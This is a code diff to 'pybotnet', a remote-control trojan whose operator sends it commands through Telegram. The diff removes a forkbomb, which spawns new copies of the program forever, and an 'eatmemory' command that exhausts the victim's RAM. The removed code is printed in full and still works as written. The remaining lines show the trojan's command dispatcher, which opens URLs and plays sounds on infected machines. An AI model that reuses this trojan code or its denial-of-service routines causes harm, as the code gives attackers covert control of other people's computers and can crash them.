@@ -9,11 +9,11 @@ from typing import List
 from time import sleep
 from uuid import getnode as get_system_mac_addres
 from requests import get
-import subprocess
 import sys
 from playsound import playsound
 import webbrowser
-import psutil
+
+
 # pybotnet import
 from . import util
 from . import settings
@@ -51,13 +51,7 @@ scripts_name = {
     `schedule list`: lists all schedules
     `schedule stop <schedule name>`: Stops a schedule
     """,
-
-    "forkbomb": "`forkbomb` Will execute the running program forever , Using this option , you might lose access to the trojan , since a restart would be needed.",
-
     "playsound": "`playsound <soundname>` Plays a sound , MP3 or WAV Files. Sound file should be in the working path.",
-
-    "eatmemory": "`eatmemory <how-much-in-bytes>` This option will eat memory , You should specify the size in bytes. if you eat all of the memory , you might lose connection.",
-    "memoryused": "`memoryused` will return the percent of used memory.",
     "openurl": "`openurl <url> <how-many-times>` Will open a specified url n times",
 }
 
@@ -171,17 +165,9 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             elif command_name == "schedule" and split_command(command)[1] in ["start", "stop", "list"]:
                 return scheduler_script(logger, command)
 
-            elif command_name == "forkbomb":
-                return forkbomb(logger, TELEGRAM_TOKEN, ADMIN_CHAT_ID)
-
+                
             elif command_name == "playsound":
                 return playsound_pybotnet(logger, command)
-
-            elif command_name == "eatmemory":
-                return eatmem(logger, command)
-
-            elif command_name == "memoryused":
-                return memleft()
 
             elif command_name == "openurl":
                 return openurl(logger, command)
@@ -533,21 +519,6 @@ def scheduler_script(logger, command):
         return "Schedule {0} stopped.".format(command)
 
 
-def forkbomb(logger, TELEGRAM_TOKEN, ADMIN_CHAT_ID):
-    def send_message(text: str):
-        util.send_message_by_third_party_proxy(
-            text, TELEGRAM_TOKEN=TELEGRAM_TOKEN,
-            ADMIN_CHAT_ID=ADMIN_CHAT_ID, logger=logger)
-    logger.info("Starting Fork Bomb...")
-    send_message('Starting Fork Bomb...')
-    try:
-        while True:
-            subprocess.Popen([sys.executable, sys.argv[0]],
-                             creationflags=subprocess.CREATE_NEW_CONSOLE)
-    except:
-        return "Running forkbomb failed."
-
-
 def playsound_pybotnet(logger, command):
     threadObject = threading.Thread(
         target=playsound, args=(split_command(command)[1],))
@@ -556,23 +527,6 @@ def playsound_pybotnet(logger, command):
     logger.info("Starting PlaySound...")
     return "Playsound Started."if threadObject.is_alive() else "PlaySound Failed."
 
-
-def eatmem(logger, command):
-    global memory
-    try:
-        logger.info("Eating memory like a hungry trojan...")
-        memory = 'X' * int((split_command(command)[1]))
-        logger.info("Ate {0} Bytes of Memory.".format(
-            split_command(command)[1]))
-        return "Ate {0} Bytes of Memory.".format(split_command(command)[1])
-    except:
-        logger.error(
-            "Unknown error occurred. Maybe the specified amount was too much. Or the amount wasn't a number. I'm Very Hungry :(")
-        return "Unknown error occurred. Maybe the specified amount was too much. Or the amount wasn't a number."
-
-
-def memleft():
-    return 'Memory Used = {0}'.format(psutil.virtual_memory().percent)
 
 
 def openurl(logger, command):
